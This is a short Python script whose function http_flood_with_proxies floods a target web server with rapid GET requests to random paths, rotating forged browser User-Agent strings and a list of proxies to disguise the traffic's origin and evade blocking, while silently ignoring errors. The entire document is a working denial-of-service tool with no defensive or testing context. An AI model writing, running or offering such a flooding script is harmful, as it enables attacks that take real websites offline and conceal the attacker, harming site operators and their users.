import requests
import random
import time

URLS = ["/", "/index.html", "/search?q=test", "/api/users", "/products", "/login", "/images/logo.png"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
]

PROXIES = ["http://proxy1.example.com:8080", "http://proxy2.example.com:3128", "http://proxy3.example.com:80", "socks5://proxy4.example.com:1080"]

def http_flood_with_proxies(target_host, duration=60):
    base_url = f"http://{target_host}:80"
    end_time = time.time() + duration
    request_count = 0
    
    while time.time() < end_time:
        try:
            url = base_url + random.choice(URLS)
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            }
            proxy = {'http': random.choice(PROXIES)}
            response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
            request_count += 1

            print(f"[+] Sent {request_count} total requests")
        except Exception as e:
            pass